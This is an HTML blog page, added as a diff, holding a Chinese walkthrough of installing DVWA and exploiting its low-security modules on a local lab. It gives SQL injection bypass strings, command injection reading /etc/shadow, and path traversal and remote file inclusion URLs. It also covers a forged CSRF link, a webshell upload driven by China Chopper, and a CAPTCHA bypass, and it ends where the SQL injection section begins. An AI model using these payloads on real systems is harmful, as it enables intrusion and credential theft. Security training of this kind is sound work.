@@ -1,0 +1,1245 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.2 -->
+    <script>
+        window.materialVersion = "1.5.2"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1',
+            '1.5.0'
+        ]
+    </script>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+    <link rel="dns-prefetch" href="https://cdn1.lncld.net">
+
+
+    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info">
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <!-- Title -->
+    
+    <title>
+        
+            DVWA的安装与Low级别的web漏洞 | 
+        
+        K&#39;s House
+    </title>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
+    <link rel="icon" href="/img/favicon.png">
+
+    <meta name="format-detection" content="telephone=no">
+    <meta name="description" itemprop="description" content="Trust me,Lisa.">
+    <meta name="keywords" content=",Kali,DVWA，渗透">
+    <meta name="theme-color" content="#0097A7">
+
+    <!-- Disable Fucking Bloody Baidu Tranformation -->
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+            
+                <style id="prettify_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_css","/css/prettify.min.css?zp8STOU9v89XWFEnN+6YmQ==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+                <style id="prettify_theme"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_theme","/css/prettify/tomorrow-night-eighties.min.css?2LJQzURO+Kr8r/fl/T8oMA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+            
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #8eb515 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #8eb515 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #8eb515 !important;
+  }
+
+  .toTop {
+    background: #66FFCC !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #66FFCC;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #66FFCC;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #66FFCC;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-image: url(https://i.loli.net/2018/07/14/5b49ef4ea363b.png);
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icons -->
+
+
+    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","https://cdn.bootcss.com/jquery/2.2.1/jquery.js", true)</script>
+    
+
+    <!-- WebAPP Icons -->
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="application-name" content="K&#39;s House">
+    <meta name="msapplication-starturl" content="https://kabeor.github.io/DVWA low级别测试/">
+    <meta name="msapplication-navbutton-color" content="#0097A7">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="K&#39;s House">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="/img/favicon.png">
+
+    <!-- Site Verification -->
+    <meta name="google-site-verification" content="Etqhw6dphuFVSwU2ZmblJOkL25LXRDWPJGSxC4cp3Ww">
+    
+
+    <!-- RSS -->
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="https://kabeor.github.io/DVWA low级别测试/">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="DVWA的安装与Low级别的web漏洞 | K&#39;s House">
+    <meta property="og:image" content="/img/favicon.png">
+    <meta property="og:description" content="Trust me,Lisa.">
+    <meta property="og:article:tag" content="Kali"> <meta property="og:article:tag" content="DVWA，渗透"> 
+
+    
+        <meta property="article:published_time" content="Mon Mar 05 2018 13:09:08 GMT+0800">
+        <meta property="article:modified_time" content="Sun Jul 15 2018 22:55:57 GMT+0800">
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="https://kabeor.github.io/DVWA low级别测试/index.html">
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "https://kabeor.github.io/DVWA low级别测试/index.html",
+    "headline": "DVWA的安装与Low级别的web漏洞",
+    "datePublished": "Mon Mar 05 2018 13:09:08 GMT+0800",
+    "dateModified": "Sun Jul 15 2018 22:55:57 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "kabeor",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/avatar.png"
+        },
+        "description": "We1C0me_t0_K's_House"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "K&#39;s House",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/favicon.png"
+        }
+    },
+    "keywords": ",Kali,DVWA，渗透",
+    "description": "Trust me,Lisa.",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+        <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-113413523-1', 'auto');ga('send', 'pageview');
+</script>
+    
+    
+        <script>
+    var _hmt = _hmt || [];
+    (function() {var hm = document.createElement('script');
+    hm.src = 'https://hm.baidu.com/hm.js?36fc4c782bfb2b103fe864229cd9ea5d';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random1/m-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                DVWA的安装与Low级别的web漏洞
+            </p>
+        </div>
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar">
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>kabeor</strong>
+        <span>3月 05, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/DVWA，渗透/">DVWA，渗透</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/Kali/">Kali</a>
+    </li></ul>
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+
+    <!-- Share Twitter -->
+    
+
+    <!-- Share Facebook -->
+    
+
+    <!-- Share Google+ -->
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+    
+</div>
+                
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <p>#DVWA的安装与Low级别的web漏洞<br>    <a href="http://www.freebuf.com/author/lonehand" target="_blank" rel="noopener">http://www.freebuf.com/author/lonehand</a></p>
+<p>##安装DVWA<br>进入github下载: <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>把解压后的文件放在WWW文件夹下<br>进入DVWA，打开config目录里的config.inc.php<br>修改数据库账号密码</p>
+<pre><code>$_DVWA = array();
+$_DVWA[ &apos;db_server&apos; ]   = &apos;127.0.0.1&apos;;
+$_DVWA[ &apos;db_database&apos; ] = &apos;dvwa&apos;;
+$_DVWA[ &apos;db_user&apos; ]     = &apos;root&apos;;
+$_DVWA[ &apos;db_password&apos; ] = &apos;123&apos;;
+</code></pre><p>打开<a href="http://127.0.0.1/DVWA/setup.php，点击下面的按钮，这样就会创建数据库了" target="_blank" rel="noopener">http://127.0.0.1/DVWA/setup.php，点击下面的按钮，这样就会创建数据库了</a><br>（密码需要和MYSQL密码一致，忘记可在phpstudy中重置）</p>
+<p>创建好后自动跳转到登陆首页<br>默认账号密码admin/password<br><img src="https://i.loli.net/2017/11/14/5a0ada8bf1286.png" alt="20170208221234546.png"></p>
+<blockquote>
+<p>allow_url_include的修改</p>
+</blockquote>
+<p>phpstudy默认为off<br>去phpinfo看Loaded Configuration File发现指向C:\phpstudy\php\php-5.4.45\php.ini，于是去这里查找并修改off为on</p>
+<p>##Low级别测试<br>DVWA共有十个模块，分别是Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。</p>
+<p>###Brute Force（暴力（破解））</p>
+<blockquote>
+<p>方法一</p>
+</blockquote>
+<p>1.抓包<br>2.右键将包发送到intruder中<br>3.把默认变量全部清除，然后选中密码，单击“Add”按钮将之设为需要破解的变量<br>4.由于只有一个变量，因而“Attack type”攻击类型这里选择Sniper。<br>然后在“Payloads”选项中进行设置，由于只有一个变量，因而“Payload set”自动设置为1，“Payload type”这里设置为“Brute forcer”。在下面的“Payload Options”中设置暴力破解所采用的字符集，以及最小和最大密码长度。<br>5.在菜单栏中选择“Intruder/Start attack”，就可以开始暴力破解<br>6尝试在爆破结果中找到正确的密码，可以看到password的响应包长度与众不同</p>
+<blockquote>
+<p>方法二</p>
+</blockquote>
+<ol>
+<li><p>Username: admin’ or ’1′=’1<br>Password:（空）<br>注入成功</p>
+</li>
+<li><p>Username: admin’ #<br>Password :（空）<br>注入成功</p>
+</li>
+</ol>
+<p>###Command Injection（命令行注入）<br>命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一</p>
+<blockquote>
+<p>漏洞利用</p>
+</blockquote>
+<p>window和linux系统都可以用&amp;&amp;来执行多条命令</p>
+<pre><code>127.0.0.1&amp;&amp;net user
+</code></pre><p>Linux下输入127.0.0.1&amp;&amp;cat /etc/shadow甚至可以读取shadow文件</p>
+<p>###CSRF（跨站请求伪造）<br>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p>
+<p>服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制</p>
+<p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p>
+<p>我们可以使用短链接来隐藏URL，因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的</p>
+<p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。</p>
+<blockquote>
+<p>漏洞利用</p>
+</blockquote>
+<p>构造url<br>    <a href="http://127.0.0.1/DVWA/vulnerabilities/csrf/？password_new=password&amp;password_conf=password&amp;Change=Change#" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/csrf/？password_new=password&amp;password_conf=password&amp;Change=Change#</a><br>当受害者点击了这个链接，他的密码就会被改成password</p>
+<p>###File Inclusion（文件包含）<br>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
+<p>服务器端对page参数没有做任何的过滤跟检查。服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<blockquote>
+<p>漏洞利用</p>
+</blockquote>
+<p>1.本地文件包含</p>
+<p>构造url<br>    <a href="http://127.0.0.1/DVWA/vulnerabilities/fi/？page=/etc/shadow" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/？page=/etc/shadow</a><br>报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径<br>    C:\phpstudy\WWW<br>构造url（绝对路径）<br>    <a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpstudy\WWW\dvwa\php.ini" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpstudy\WWW\dvwa\php.ini</a><br>成功读取了服务器的php.ini文件<br>    ; This file attempts to overwrite the original php.ini file. Doesnt always work. magic_quotes_gpc = Off allow_url_fopen = On allow_url_include = On<br>构造url（相对路径）<br>    <a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\..\phpstudy\WWW\dvwa\php.ini" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\..\phpstudy\WWW\dvwa\php.ini</a><br>加这么多..\是为了保证到达服务器的C盘根目录</p>
+<p>2.远程文件包含<br>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
+<p>在远程服务器192.168.5.12上传一个phpinfo.txt文件，内容如下<br><img src="https://i.loli.net/2018/07/15/5b4b60796ad22.jpg" alt></p>
+<p>构造url<br>    <a href="http://127.0.0.1/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt" target="_blank" rel="noopener">http://127.0.0.1/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt</a><br>成功在服务器上执行了phpinfo函数<br>为了增加隐蔽性，可以对<a href="http://192.168.5.12/phpinfo.txt进行编码" target="_blank" rel="noopener">http://192.168.5.12/phpinfo.txt进行编码</a><br>同样可以执行成功</p>
+<p>###File Upload（文件上传）<br>File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。</p>
+<p>服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p>
+<blockquote>
+<p>漏洞利用</p>
+</blockquote>
+<p>文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。<br>上传文件hack.php<br><img src="https://i.loli.net/2018/07/15/5b4b60797e4f6.jpg" alt><br>上传成功，并且返回了上传路径</p>
+<p>打开中国菜刀，右键添加，地址栏填入上传文件所在路径<br>    <a href="http://127.0.0.1/dvwa/hackable/uploads/hack.php" target="_blank" rel="noopener">http://127.0.0.1/dvwa/hackable/uploads/hack.php</a><br>参数名（一句话木马口令）为apple<br><img src="https://i.loli.net/2018/07/15/5b4b60799f8f6.jpg" alt></p>
+<p>然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。<br>可以下载、修改服务器的所有文件。可以打开服务器的虚拟终端。</p>
+<p>###Insecure CAPTCHA （不安全的验证码）<br>Insecure CAPTCHA，意思是不安全的验证码，CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。</p>
+<p>服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p>
+<blockquote>
+<p>漏洞利用</p>
+</blockquote>
+<p>1.通过构造参数绕过验证过程的第一步<br>首先输入密码，点击Change按钮，抓包：<br>因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有recaptcha_challenge_field、recaptcha_response_field两个参数）</p>
+<p>更改step参数绕过验证码：<br><img src="https://i.loli.net/2018/07/15/5b4b6079c3d44.jpg" alt></p>
+<p>在Burpsuite中右键send to Repeater，在Repeater中点击go<br>修改密码成功</p>
+<p>###SQL Injection（SQL注入）<br>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。<br>自动化的注入神器sqlmap</p>
+<blockquote>
+<p>手工注入思路</p>
+</blockquote>
+<p>1.判断是否存在注入，注入是字符型还是数字型<br>2.猜解SQL查询语句中的字段数<br>3.确定显示的字段顺序<br>4.获取当前数据库<br>5.获取数据库中的表<br>6.获取表中的字段名<br>7.下载数据</p>
+<blockquote>
+<p>漏洞利用</p>
+</blockquote>
